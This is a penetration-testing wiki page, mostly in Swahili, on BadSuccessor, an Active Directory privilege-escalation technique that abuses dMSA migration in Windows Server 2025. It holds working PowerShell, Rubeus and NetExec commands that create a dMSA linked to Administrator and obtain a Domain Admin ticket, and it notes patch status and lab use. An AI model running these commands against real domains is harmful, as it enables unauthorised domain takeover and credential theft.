# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

**BadSuccessor** hutumia vibaya mtiririko wa uhamiaji wa **delegated Managed Service Account** (**dMSA**) ulioanzishwa katika **Windows Server 2025**. dMSA inaweza kuunganishwa na akaunti ya zamani kupitia **`msDS-ManagedAccountPrecededByLink`** na kuhamishwa kupitia hali za uhamiaji zilizohifadhiwa kwenye **`msDS-DelegatedMSAState`**. Kama mshambulizi anaweza kuunda dMSA ndani ya OU inayoweza kuandikwa na kudhibiti sifa hizo, KDC inaweza kutoa tickets kwa dMSA inayodhibitiwa na mshambulizi ikiwa na **authorization context ya akaunti iliyounganishwa**.

Kwa vitendo, hii inamaanisha mtumiaji mwenye mamlaka ya chini ambaye ana tu delegated OU rights anaweza kuunda dMSA mpya, kuiweka kwa `Administrator`, kukamilisha state ya uhamiaji, kisha kupata TGT ambayo PAC yake ina vikundi vya mamlaka kama **Domain Admins**.

## Maelezo ya uhamiaji ya dMSA yanayohusika

- dMSA ni kipengele cha **Windows Server 2025**.
- `Start-ADServiceAccountMigration` huweka uhamiaji kwenye hali ya **started**.
- `Complete-ADServiceAccountMigration` huweka uhamiaji kwenye hali ya **completed**.
- `msDS-DelegatedMSAState = 1` humaanisha uhamiaji umeanza.
- `msDS-DelegatedMSAState = 2` humaanisha uhamiaji umekamilika.
- Wakati wa uhamiaji halali, dMSA inakusudiwa kuchukua nafasi ya akaunti iliyopita bila kuonekana, hivyo KDC/LSA huhifadhi access ambayo akaunti ya awali tayari ilikuwa nayo.

Microsoft Learn pia inaeleza kwamba wakati wa uhamiaji akaunti ya asili hufungwa na dMSA na dMSA inakusudiwa kufikia kile ambacho akaunti ya zamani ingeweza kufikia. Huu ndio msingi wa usalama ambao BadSuccessor hutumia vibaya.

## Mahitaji

1. Domain ambamo **dMSA ipo**, yaani kuna usaidizi wa **Windows Server 2025** upande wa AD.
2. Mshambulizi anaweza **kuunda** vitu vya `msDS-DelegatedManagedServiceAccount` katika baadhi ya OU, au ana broad child-object creation rights sawia huko.
3. Mshambulizi anaweza **kuandika** sifa husika za dMSA au kudhibiti kikamilifu dMSA aliyoitengeneza hivi karibuni.
4. Mshambulizi anaweza kuomba Kerberos tickets kutoka context iliyo domain-joined au kutoka kwenye tunnel inayofika LDAP/Kerberos.

### Ukaguzi wa vitendo

Ishara safi zaidi kwa operator ni kuthibitisha domain/forest level na kuhakikisha environment tayari inatumia stack mpya ya Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Iwapo utaona thamani kama `Windows2025Domain` na `Windows2025Forest`, chukulia **BadSuccessor / dMSA migration abuse** kama ukaguzi wa kipaumbele.

Unaweza pia kuorodhesha OUs zinazoweza kuandikwa zilizopewa mamlaka kwa uundaji wa dMSA kwa kutumia zana za umma:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Mtiririko wa matumizi mabaya

1. Tengeneza dMSA katika OU ambapo una delegated create-child rights.
2. Weka **`msDS-ManagedAccountPrecededByLink`** kuwa DN ya target yenye privilege kama `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Weka **`msDS-DelegatedMSAState`** kuwa `2` ili kuashiria kwamba uhamishaji umekamilika.
4. Omba TGT kwa dMSA mpya na tumia ticket iliyorejeshwa kufikia privileged services.

Mfano wa PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Omba la tiketi / mifano ya zana za kiutendaji:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Kwa nini hili ni zaidi ya privilege escalation

Wakati wa uhamiaji halali, Windows pia huhitaji dMSA mpya kushughulikia tickets ambazo zilitolewa kwa account ya awali kabla ya cutover. Ndiyo maana dMSA-related ticket material inaweza kujumuisha keys za **sasa** na **zamani** katika mtiririko wa **`KERB-DMSA-KEY-PACKAGE`**.

Kwa fake migration inayodhibitiwa na attacker, tabia hiyo inaweza kugeuza BadSuccessor kuwa:

- **Privilege escalation** kwa kurithi privileged group SIDs katika PAC.
- **Credential material exposure** kwa sababu previous-key handling inaweza kufichua material inayolingana na RC4/NT hash ya predecessor katika vulnerable workflows.

Hilo linafanya technique kuwa muhimu kwa direct domain takeover na pia kwa follow-on operations kama pass-the-hash au wider credential compromise.

## Maelezo kuhusu hali ya patch

Tabia ya awali ya BadSuccessor **si tu issue ya kinadharia ya preview ya 2025**. Microsoft ilipeleka **CVE-2025-53779** na kuchapisha security update mnamo **Agosti 2025**. Hifadhi attack hii kama ilivyoandikwa kwa:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **uthibitishaji wa OU delegations na dMSA exposure wakati wa assessments**

Usidhani domain ya Windows Server 2025 iko vulnerable kwa sababu tu dMSA ipo; thibitisha kiwango cha patch na ujaribu kwa uangalifu.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
